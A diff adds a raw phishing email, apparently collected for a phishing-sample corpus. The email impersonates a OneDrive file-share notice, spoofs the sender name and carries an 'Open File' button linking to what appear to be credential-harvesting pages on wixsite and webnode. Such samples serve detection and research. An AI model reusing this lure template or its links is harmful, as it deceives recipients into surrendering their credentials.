@@ -1,0 +1,99 @@
+From jose@monkey.org Mon Mar  6 12:56:31 2023 +0000
+Return-Path: ajay@kaiadvisors.com
+Delivered-To: jose@monkey.org
+X-FDA: 80538472182.22.A06A7A1
+Received: from auto-wave.co.jp (auto-wave.co.jp [153.122.54.140])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id AE75E10F05017
+	for <jose@monkey.org>; Mon,  6 Mar 2023 12:56:30 +0000 (UTC)
+Received: from kaiadvisors.com (unknown [23.152.0.241])
+	by auto-wave.co.jp (Postfix) with ESMTPSA id 3BB2D3D0E24D
+	for <jose@monkey.org>; Mon,  6 Mar 2023 21:38:52 +0900 (JST)
+From: monkey.org<ajay@kaiadvisors.com>
+To: jose@monkey.org
+Subject: File on OneDrive for your review !!!
+Date: 06 Mar 2023 12:38:51 +0000
+Message-ID: <20230306123851.3D0FCF5573478606@kaiadvisors.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1678107390; a=rsa-sha256;
+	cv=none;
+	b=D29NB7vNVSLhk0HIjfzhBjdnLVMkn7gElWV4Op8Lh5RF96X2q+M6vQp8ZXHHZP2Yl8qaNs
+	JaQ9KJB4ux2YOhbfGQ4HNavjXNZdOSXFaqwujZJvlhtIbUtvRr8sT2qZsRzoGsjF5qB/y9
+	rOmHymUox77NvBeTNnA2U/c1o7XehNI=
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1678107390;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=oRLahQcaAal7wL1OLCbz3pk3MxSCYSp9SLKBZNdNiPM=;
+	b=RDbWAuQ5kqI2lF9TV/5glMv506NXWuM1WJ3/xXRfCtV8vyr/ETG6//WOAwLUbCIYlZKtyG
+	iRc+i6KZM02iV3YzLrOy47ZCkWUGIqa349Iijk4O7Hz0+jcaJcLTa5+xQgTbN6cLAu0WQw
+	ZOpgQgYP+EtjJuiHPcBjaUrmBZuOB4k=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf14.b.hostedemail.com: 153.122.54.140 is neither permitted nor denied by domain of ajay@kaiadvisors.com) smtp.mailfrom=ajay@kaiadvisors.com
+X-Rspam-User: 
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf14.b.hostedemail.com: 153.122.54.140 is neither permitted nor denied by domain of ajay@kaiadvisors.com) smtp.mailfrom=ajay@kaiadvisors.com
+X-Rspamd-Queue-Id: AE75E10F05017
+X-Rspamd-Server: rspam08
+X-Spam-Status: No, score=8.60
+X-Stat-Signature: rbn3qini85d8eipqkk77c5nasmtk4ygh
+X-HE-Tag: 1678107390-89795
+X-HE-Meta: U2FsdGVkX1/7Q1AbqW+a6SSCbiqnsSbhuWrYMHr3xhfSSG4yXHf7XjpHrfU81XxwcQH0FZEdyI1DksKm7ptJ1wXKR/VcHMrXvYIn9Od0golILZYj3SdhamvUQSpm2p86t6ctJJPrmEOP9Sbo/8RnNklZhn7fOgbebnrsvZ/ZF5m1j7HqRLNaHnpxsAZunSbricWKEX1sHcSWl6jVaTSFaEciT7D8iS3md+oyDPejZ0GDCfiyvqAr4egi09GOCebVqiHHr8uX2C+XxKIqE5cACUpO70fv6kxjjbskRX5n1IiVqJgNm9CI7kZVyTOvtcI3pgSZWy8ZJ5MCUZ9ylqGvYf+Ncwby1UDWhPvBj3jJEsGGqrf9q0KrKyfpTHrlbionL/Y5OJMJLtPDLGvCAmDgNSP6e0k+HSqfFfPClKz+41xuylC3dyOKnqlc1oq4X63U9Ed9szmnfHRbRBMiBGgXObV283+vJScoL752w9yP4wTFiNa3Y1fW0Uu6/Mb9vFMtPKasW1SQ5wN5pfqwDZjI0/kmV3JzzoVxcSfw/o82D0O04ONoVvWkr8wqwgqoS/bMboMGkrTFsPVu6HgZ6tqRKrGX4uIcAbJjr5FCEXNwt/IKU6Kvqewv3p0AOkIddZOD01QMMWxeBlf9cv+mceMVEqsp6tu3GosWVn55CbOOh/QljObEI1CMj3hNMjB0ezArWbkYdn8+UiL0Gk+ZnTa4y1hGSFsrQhBJtk8ePBQmKy/1Knk5wngNev6BOFF28LYYPWJZcsmJ6RePhXY2fh62vQ1NYe1Oq2zoHFZeIgK8OCzelabp9Dn7SugCJr+UDL1T8TbTnswC8jtXrDyG7tibKkmawzGBXZnQgWqJyPMfUrJWLPfU+kqaJBWKB/KRs1c4SUoETx71ehLmybdie9v5pZIshBi2MFIm1RvxVtPQXzTceIQbb8ut6H/Ke/8fHLDqnWqBKnScMLioPp1+P2eb7JiI4Ts
+ obPlWCeU+aUjNwNd0AZuK+6IbvoLHm+PTO3t3Ut3FKoQ/Z8zzUzUOorWC964gDX+iKGzAQTJFEh9uR2UcAVACxGbCA5t3PMXJWKg5eGMAI0NCFOK+QXmIK+eI+X4im8jBdWd+oxGzb6JyHTFey0cqkbtSKALnKmsxKHzI9pPToTges7OzRk7VyRVHJmnetoqrdqxdN1k37BnkJxzYLU0usbU/JeQtfVawYjOu/JSV3p2eNae57fjqvQQF/rnPx0LE4le1
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 42
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20296"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPA=
+CING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-varian=
+t-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
+initial; text-decoration-style: initial; text-decoration-color: initial"><F=
+ONT size=3D4 face=3D"georgia, serif"><FONT color=3Dgray>
+You have received a File on&nbsp;OneDrive for your review.</FONT>&nbsp;</FO=
+NT></P>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: arial, =
+sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE:=
+ normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: norm=
+al; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2=
+; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; TEXT-I=
+NDENT: 0px; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial">
+<table style=3D"WORD-BREAK: normal">
+<TBODY>
+<TR>
+<td style=3D"MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDIN=
+G-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(38,11=
+4,236)">
+<A style=3D'BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: "segoe ui=
+ semibold", "segoe ui bold", "segoe ui", "helvetica neue medium", arial, sa=
+ns-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-=
+WIDTH: 0px; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px;=
+ TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADD=
+ING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; text-decoration-line: none' href=3D"=
+https://aspoiledwife7.wixsite.com/my-site"=20
+rel=3D"noopener &#13;&#10;&#13;&#10;&#13;&#10;noreferrer" target=3D_blank d=
+ata-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://doc-shared-77=
+0.webnode.page/contact/&amp;source=3Dgmail&amp;ust=3D1676535429417000&amp;u=
+sg=3DAOvVaw3kuQyBfMrthlgS9S7c3-D_">Open File</A></TD></TR></TBODY></TABLE><=
+/DIV></BODY></HTML>
